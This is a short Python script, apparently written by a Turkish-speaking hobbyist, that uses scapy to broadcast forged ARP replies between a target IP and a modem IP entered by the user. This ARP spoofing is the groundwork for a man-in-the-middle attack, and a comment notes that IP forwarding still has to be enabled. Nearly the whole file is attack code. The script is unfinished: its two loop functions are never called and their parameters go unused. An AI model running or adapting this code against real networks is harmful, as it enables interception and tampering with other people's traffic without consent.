from scapy.all import *
import _thread
def listen(target,modem):
    while True:
        time.sleep(10)
        sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(psrc=targetIP,pdst=modemIP))
        #IP forwarding yapmak gerek

def attack(target,modem):
    while True:
        time.sleep(10)
        sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(psrc=modemIP,pdst=targetIP)) ## Ağda broadcast yapılcaksa dst = FF:FF:FF... şeklinde girilir

targetIP = input("Target IP : ")
modemIP = input("Modem IP : ")
